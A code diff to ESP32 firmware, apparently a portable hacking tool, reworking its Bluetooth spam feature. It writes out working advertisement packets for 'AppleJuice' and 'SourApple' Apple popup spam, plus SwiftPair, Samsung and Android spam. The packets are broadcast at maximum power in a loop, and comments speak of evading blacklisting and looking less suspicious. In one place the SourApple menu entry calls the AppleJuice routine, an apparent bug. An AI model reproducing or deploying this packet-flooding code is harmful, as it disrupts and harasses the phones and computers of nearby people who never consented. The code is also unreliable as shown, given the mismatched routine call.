@@ -3,7 +3,6 @@
 #include "core/mykeyboard.h"
 #include <globals.h>
 
-
 // Bluetooth maximum transmit power
 #if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) ||                              \
     defined(CONFIG_IDF_TARGET_ESP32S3)
@@ -39,7 +38,7 @@ struct Station {
     uint8_t mac[6];
     bool selected;
 };
-enum EBLEPayloadType { Microsoft, Apple, Samsung, Google };
+enum EBLEPayloadType { Microsoft, SourApple, AppleJuice, Samsung, Google };
 
 // globals for passing bluetooth info between routines
 // AppleJuice Payload Data
@@ -375,8 +374,8 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
             AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
             break;
         }
-        case Apple: {
-            int rand = random(3);
+        case AppleJuice: {
+            int rand = random(2);
             if (rand == 0) {
                 uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
                                       0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
@@ -389,26 +388,29 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
                                       0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
                                       0x00, 0x00};
                 AdvData.addData(std::string((char *)packet, 23));
-            } else {
-                uint8_t packet[17];
-                uint8_t i = 0;
-                packet[i++] = 16;   // Packet Length
-                packet[i++] = 0xFF; // Packet Type (Manufacturer Specific)
-                packet[i++] = 0x4C; // Packet Company ID (Apple, Inc.)
-                packet[i++] = 0x00; // ...
-                packet[i++] = 0x0F; // Type
-                packet[i++] = 0x05; // Length
-                packet[i++] = 0xC1; // Action Flags
-                const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
-                packet[i++] = types[random() % sizeof(types)]; // Action Type
-                esp_fill_random(&packet[i], 3);                // Authentication Tag
-                i += 3;
-                packet[i++] = 0x00; // ???
-                packet[i++] = 0x00; // ???
-                packet[i++] = 0x10; // Type ???
-                esp_fill_random(&packet[i], 3);
-                AdvData.addData(std::string((char *)packet, 17));
             }
+
+            break;
+        }
+        case SourApple: {
+            uint8_t packet[17];
+            uint8_t i = 0;
+            packet[i++] = 16;   // Packet Length
+            packet[i++] = 0xFF; // Packet Type (Manufacturer Specific)
+            packet[i++] = 0x4C; // Packet Company ID (Apple, Inc.)
+            packet[i++] = 0x00; // ...
+            packet[i++] = 0x0F; // Type
+            packet[i++] = 0x05; // Length
+            packet[i++] = 0xC1; // Action Flags
+            const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
+            packet[i++] = types[random() % sizeof(types)]; // Action Type
+            esp_fill_random(&packet[i], 3);                // Authentication Tag
+            i += 3;
+            packet[i++] = 0x00; // ???
+            packet[i++] = 0x00; // ???
+            packet[i++] = 0x10; // Type ???
+            esp_fill_random(&packet[i], 3);
+            AdvData.addData(std::string((char *)packet, 17));
 
             break;
         }
@@ -535,37 +537,37 @@ void executeCustomSpam(String spamName) {
     BLEDevice::deinit();
 }
 
-
-void ibeacon(char* DeviceName, char* BEACON_UUID, int ManufacturerId) {
-    // derived from https://github.com/nkolban/ESP32_BLE_Arduino/blob/master/examples/BLE_iBeacon/BLE_iBeacon.ino
+void ibeacon(char *DeviceName, char *BEACON_UUID, int ManufacturerId) {
+    // derived from
+    // https://github.com/nkolban/ESP32_BLE_Arduino/blob/master/examples/BLE_iBeacon/BLE_iBeacon.ino
     // https://github.com/espressif/arduino-esp32/blob/master/libraries/BLE/examples/iBeacon/iBeacon.ino
 
     // Generate random MAC address
     // TODO: UI field to set it
-    //uint8_t macAddr[6];
-    //for (int i = 0; i < 6; i++) { macAddr[i] = esp_random() & 0xFF; }
+    // uint8_t macAddr[6];
+    // for (int i = 0; i < 6; i++) { macAddr[i] = esp_random() & 0xFF; }
     // Set the MAC address
-    //esp_base_mac_addr_set(macAddr);
+    // esp_base_mac_addr_set(macAddr);
 
     // Initialize first time (helps clear the any previus spam)
-    BLEDevice::init(DeviceName);  // TODO: UI field to set it
+    BLEDevice::init(DeviceName); // TODO: UI field to set it
 
-    //BLEServer *pServer;
-    //pServer = BLEDevice::createServer();
-    //pServer->setCallbacks(new MyServerCallbacks());
+    // BLEServer *pServer;
+    // pServer = BLEDevice::createServer();
+    // pServer->setCallbacks(new MyServerCallbacks());
 
-    delay(5);
+    vTaskDelay(5 / portTICK_PERIOD_MS);
 
     // Set to maximum power
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
 
     // Setup beacon
     NimBLEBeacon myBeacon;
-    myBeacon.setManufacturerId(0x4c00);  // TODO: UI field to set it
+    myBeacon.setManufacturerId(0x4c00); // TODO: UI field to set it
     myBeacon.setMajor(5);
     myBeacon.setMinor(88);
     myBeacon.setSignalPower(0xc5);
-    myBeacon.setProximityUUID(BLEUUID(BEACON_UUID));  // TODO: UI field to set it
+    myBeacon.setProximityUUID(BLEUUID(BEACON_UUID)); // TODO: UI field to set it
 
     // Get the advertising object
     pAdvertising = BLEDevice::getAdvertising();
@@ -573,15 +575,15 @@ void ibeacon(char* DeviceName, char* BEACON_UUID, int ManufacturerId) {
     BLEAdvertisementData advertisementData = BLEAdvertisementData();
 
     // make discoverable
-    //advertisementData.setFlags(0x04); // BR_EDR_NOT_SUPPORTED 0x04
+    // advertisementData.setFlags(0x04); // BR_EDR_NOT_SUPPORTED 0x04
     advertisementData.setFlags(0x1A);
     advertisementData.setManufacturerData(myBeacon.getData());
 
     // add 3 random digits to the end so it doesnt get blacklisted
     // String randomName = spamName + "_" + String(esp_random() % 100); //not needed since were changing mac
-    //advertisementData.setName(spamName.c_str());
+    // advertisementData.setName(spamName.c_str());
 
-    //pAdvertising->addServiceUUID(BLEUUID("1812")); // set to HID service so it seems less sus
+    // pAdvertising->addServiceUUID(BLEUUID("1812")); // set to HID service so it seems less sus
 
     // Set the advertisement data
     pAdvertising->setAdvertisementData(advertisementData);
@@ -593,8 +595,8 @@ void ibeacon(char* DeviceName, char* BEACON_UUID, int ManufacturerId) {
     padprintln("Press Any key to STOP.");
 
     while (!check(AnyKeyPress)) {
-        //max_loops -= 1;
-        //if (max_loops <= 0) break;
+        // max_loops -= 1;
+        // if (max_loops <= 0) break;
 
         // Start advertising
         pAdvertising->start();
@@ -602,11 +604,11 @@ void ibeacon(char* DeviceName, char* BEACON_UUID, int ManufacturerId) {
         Serial.println("Advertizing started...");
 
         // Advertise for 20ms
-        delay(20);  // TODO: UI field to set it
+        vTaskDelay(20 / portTICK_PERIOD_MS); // TODO: UI field to set it
 
         // Stop and clean up
         pAdvertising->stop();
-        delay(10);
+        vTaskDelay(10 / portTICK_PERIOD_MS);
 
         Serial.println("Advertizing stop");
     }
@@ -614,45 +616,49 @@ void ibeacon(char* DeviceName, char* BEACON_UUID, int ManufacturerId) {
     BLEDevice::deinit();
 }
 
-
 void aj_adv(int ble_choice) { // customSet defaults to false
     int mael = 0;
     int timer = 0;
     int count = 0;
     String spamName = "";
-    if (ble_choice == 5) { spamName = keyboard("", 10, "Name to spam"); }
+    if (ble_choice == 6) { spamName = keyboard("", 10, "Name to spam"); }
     timer = millis();
     while (1) {
         if (millis() - timer > 100) {
 
             switch (ble_choice) {
                 case 0: // Applejuice
-                    displayTextLine("iOS Spam (" + String(count) + ")");
-                    executeSpam(Apple);
+                    displayTextLine("Applejuice (" + String(count) + ")");
+                    executeSpam(AppleJuice);
                     break;
-                case 1: // SwiftPair
+                case 1: // SourApple
+                    displayTextLine("SourApple (" + String(count) + ")");
+                    executeSpam(AppleJuice);
+                    break;
+                case 2: // SwiftPair
                     displayTextLine("SwiftPair  (" + String(count) + ")");
                     executeSpam(Microsoft);
                     break;
-                case 2: // Samsung
+                case 3: // Samsung
                     displayTextLine("Samsung  (" + String(count) + ")");
                     executeSpam(Samsung);
                     break;
-                case 3: // Android
+                case 4: // Android
                     displayTextLine("Android  (" + String(count) + ")");
                     executeSpam(Google);
                     break;
-                case 4: // Tutti-frutti
+                case 5: // Tutti-frutti
                     displayTextLine("Spam All  (" + String(count) + ")");
                     if (mael == 0) executeSpam(Google);
                     if (mael == 1) executeSpam(Samsung);
                     if (mael == 2) executeSpam(Microsoft);
-                    if (mael == 3) {
-                        executeSpam(Apple);
+                    if (mael == 3) executeSpam(SourApple);
+                    if (mael == 4) {
+                        executeSpam(AppleJuice);
                         mael = 0;
                     }
                     break;
-                case 5: // custom
+                case 6: // custom
                     displayTextLine("Spamming " + spamName + "(" + String(count) + ")");
                     executeCustomSpam(spamName);
             }
